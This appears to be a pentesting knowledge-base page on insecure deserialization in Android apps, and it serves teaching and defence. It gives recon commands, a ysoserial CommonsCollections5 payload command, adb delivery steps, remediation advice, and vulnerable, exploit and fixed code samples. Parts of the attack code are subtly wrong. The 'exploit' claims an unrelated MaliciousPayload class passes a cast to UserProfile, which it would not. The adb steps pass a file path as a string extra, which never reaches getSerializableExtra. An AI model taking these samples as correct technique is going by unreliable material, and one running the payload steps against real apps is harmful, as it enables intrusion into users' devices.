---
title: "Insecure deserialization"
description: "Untrusted Serializable and Parcelable payloads from intent extras, unsafe Gson/JSON object instantiation, and the path from object injection to logic abuse or RCE."
tags:
  - Android
  - Deserialization
  - Intents
  - Exported Components
---

# Insecure deserialization

!!! note "What this page is doing"
    Deserialization bugs on Android are almost always reached through IPC: an exported activity, service or broadcast receiver hands attacker-controlled bytes to `readObject()`, `getSerializableExtra()`, or a JSON library configured to instantiate arbitrary types. The crash or the odd log line is the symptom; the fix is at the boundary where untrusted data turns into a live object.

## Explanation

Three distinct mechanisms get grouped under this heading:

- **Java `Serializable` from an intent extra.** `Intent.getSerializableExtra()` calls `ObjectInputStream.readObject()` on bytes the caller supplied. If any class on the classpath has a `readObject()` override with a side effect (a constructor-adjacent gadget, a file write, a reflective call), a crafted object graph can trigger it before the app ever reaches its own logic. This is the same class of bug as Java deserialization RCE on the server side, just reached over `startActivity()` instead of a socket.
- **`Parcelable` type confusion.** `Parcelable` is not reflection-based like `Serializable`, but an app that trusts a `className` field inside the parcel and does `Class.forName(className)` to decide how to unmarshal it opens the same door — the caller picks the class.
- **Unsafe JSON-to-object mapping.** Gson, by default, only populates fields it finds matching names for and does not execute arbitrary code — but `TypeAdapter` implementations that call `Class.forName()` on an attacker-supplied type field, or Gson configured with `RuntimeTypeAdapterFactory` without a type allowlist, let the caller choose which class gets instantiated and populated. That is object injection even without classic Java serialization gadgets: it lets an attacker instantiate an unexpected class, populate its fields, and get the app to act on an object it didn't design for from that input.

The common root cause: the receiving component decides what type something is based on data the caller controls, instead of from a fixed, known contract.

## Exploitation

1. Find an exported component that reads a `Serializable` or a typed JSON blob from its launching `Intent`.
2. Confirm what it does with the extra — cast it, call a method on it, or pass it onward — since that determines whether a type-confusion bug is reachable at all here, or whether you need an actual gadget class present on the classpath for RCE.
3. Build an `Intent` (or JSON payload) that supplies a different, but compatible-enough, object: a subclass with an overridden `readObject()`, an unexpected concrete type that satisfies the cast, or a class the app did not expect to receive at that call site.
4. Launch it with `adb` against the exported component and observe the effect — usually a logic bypass (skipping a check the real object's constructor applied) rather than code execution, but with a suitable gadget on the classpath (an old Apache Commons Collections or similar library bundled into the APK) a crafted chain can reach it.

## Steps

```bash
# 1. Find exported activities that might read untrusted extras
adb shell dumpsys package <package> | grep -A3 -iE "Activity" | grep -iE "exported=true"

# 2. Decompile and confirm the call site
jadx -d target_jadx target.apk
grep -rn "getSerializableExtra\|getParcelableExtra\|Class.forName" target_jadx/sources/

# 3. Check for known deserialization gadget libraries bundled in the APK —
#    an old Commons Collections, Groovy, or similar jar increases RCE risk
unzip -l target.apk | grep -iE "commons-collections|groovy|beanutils"

# 4. Confirm the component is reachable without authentication
adb shell am start -n <package>/<exported_activity> \
    --es probe "reachability-check"

# 5. Serialize a malicious object graph to a file (ysoserial-style payload,
#    built against a gadget chain confirmed present in step 3)
java -jar ysoserial.jar CommonsCollections5 'id' > payload.ser

# 6. Deliver it as the Serializable extra on the exported activity
adb push payload.ser /sdcard/payload.ser
adb shell am start -n <package>/<exported_activity> \
    --es serialized_payload_path /sdcard/payload.ser

# 7. Watch logcat for the deserialization path firing and any resulting
#    command execution or crash
adb logcat | grep -iE "ObjectInputStream|readObject|ClassNotFoundException"
```

## Remediation

- Never pass `Serializable`/`Parcelable` extras from an exported component straight into a cast or a method call without validating the concrete type first: check `instanceof` against the one expected class before using the object.
- Prefer `Parcelable` over `Serializable` for IPC in general — it is not reflection-driven — but still validate the declared class name against an allowlist before `Class.forName()`, if the parcel format carries one at all.
- For JSON, bind to a fixed, closed set of concrete types. If polymorphic deserialization is required, use an explicit allowlist (`RuntimeTypeAdapterFactory.of(Base.class).registerSubtype(Known.class, "known")`) rather than letting a `type` field in the payload name an arbitrary class.
- Avoid Java's built-in serialization for anything that crosses a trust boundary — intents included. A `Bundle` of primitive, explicitly-typed fields is both safer and smaller than a serialized object graph.
- Keep an inventory of libraries bundled into the APK and update any with known deserialization gadget chains; a gadget class doesn't need to be exploitable by the app's own code to be exploitable through a crafted object graph.
- Set `android:exported="false"` on any component that has no legitimate external caller, and require a signature-level permission on the ones that do.

## Example

**Vulnerable — exported activity trusts the extra's concrete type:**

```java
// AndroidManifest.xml: <activity android:name=".ImportActivity" android:exported="true" />
public class ImportActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // No type check: whatever Serializable the caller supplied is cast
        // directly and acted on.
        UserProfile profile = (UserProfile) getIntent().getSerializableExtra("profile");
        applyProfile(profile); // e.g. grants entitlements based on profile.isPremium
    }

    private void applyProfile(UserProfile profile) {
        if (profile.isPremium()) {
            unlockPremiumFeatures();
        }
    }
}
```

**Exploit — a different class satisfies the cast and the logic check:**

```java
// Attacker-controlled app, launching the exported activity with a
// forged object graph instead of a real UserProfile
public class MaliciousPayload implements Serializable {
    // Crafted to satisfy whatever the receiving app's isPremium() check
    // actually inspects — here, simply always true.
    public boolean isPremium() { return true; }
}

Intent intent = new Intent();
intent.setClassName("com.victim.app", "com.victim.app.ImportActivity");
intent.putExtra("profile", (Serializable) buildForgedProfile());
startActivity(intent);
```

```bash
# Same idea delivered from adb, against a prebuilt forged payload
adb push forged_profile.ser /sdcard/forged_profile.ser
adb shell am start -n com.victim.app/.ImportActivity \
    --es profile_payload_path /sdcard/forged_profile.ser
```

**Fix — validate the concrete type before trusting the object:**

```java
public class ImportActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Serializable extra = getIntent().getSerializableExtra("profile");

        // Reject anything that is not exactly the expected, final class
        if (!(extra instanceof UserProfile) || extra.getClass() != UserProfile.class) {
            finish();
            return;
        }

        UserProfile profile = (UserProfile) extra;
        // Re-derive entitlement server-side instead of trusting the client object
        verifyEntitlementWithBackend(profile.getUserId());
    }
}
```
